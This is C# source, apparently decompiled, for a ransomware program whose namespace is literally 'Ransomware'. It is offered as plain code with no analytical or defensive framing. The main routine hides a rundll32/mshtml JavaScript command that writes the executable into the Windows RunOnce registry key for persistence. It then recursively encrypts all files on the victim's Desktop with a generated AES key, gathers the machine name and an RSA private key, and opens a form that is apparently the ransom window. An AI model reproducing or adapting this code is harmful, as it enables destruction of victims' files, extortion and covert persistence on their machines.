using System;
using System.Collections.Specialized;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using GHack;

namespace Ransomware;

internal static class Program
{
	public enum ShowCommands
	{
		SW_HIDE = 0,
		SW_SHOWNORMAL = 1,
		SW_NORMAL = 1,
		SW_SHOWMINIMIZED = 2,
		SW_SHOWMAXIMIZED = 3,
		SW_MAXIMIZE = 3,
		SW_SHOWNOACTIVATE = 4,
		SW_SHOW = 5,
		SW_MINIMIZE = 6,
		SW_SHOWMINNOACTIVE = 7,
		SW_SHOWNA = 8,
		SW_RESTORE = 9,
		SW_SHOWDEFAULT = 10,
		SW_FORCEMINIMIZE = 11,
		SW_MAX = 11
	}

	[DllImport("shell32.dll")]
	private static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, ShowCommands nShowCmd);

	private static void encryptAll(string dir, byte[] aesKey)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(dir);
		try
		{
			FileInfo[] files = directoryInfo.GetFiles("*.*");
			for (int i = 0; i < files.Length; i++)
			{
				ransomwareCryptoMod.encryptFile(files[i].FullName, aesKey);
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			for (int i = 0; i < directories.Length; i++)
			{
				encryptAll(directories[i].FullName, aesKey);
			}
		}
		catch (Exception)
		{
		}
	}

	[STAThread]
	private static void Main(string[] args)
	{
		bool createdNew;
		Mutex mutex = new Mutex(initiallyOwned: false, "Rekensom", out createdNew);
		mutex.WaitOne();
		GC.Collect();
		if (createdNew)
		{
			mutex.ReleaseMutex();
			Thread.CurrentThread.Priority = ThreadPriority.Highest;
			byte[] aesKey = AES.generateKey();
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
			string lpParameters = "javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();shell=new%20ActiveXObject(\"wscript.shell\");shell.regwrite(\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\adr\",\"" + Application.get_ExecutablePath().Replace("\\", "\\\\") + "\");";
			ShellExecute(IntPtr.Zero, "open", "rundll32.exe", lpParameters, "", ShowCommands.SW_HIDE);
			encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), aesKey);
			new NameValueCollection
			{
				["pc"] = Environment.MachineName,
				["rsa"] = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true)
			};
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run((Form)(object)new Form1());
		}
	}
}
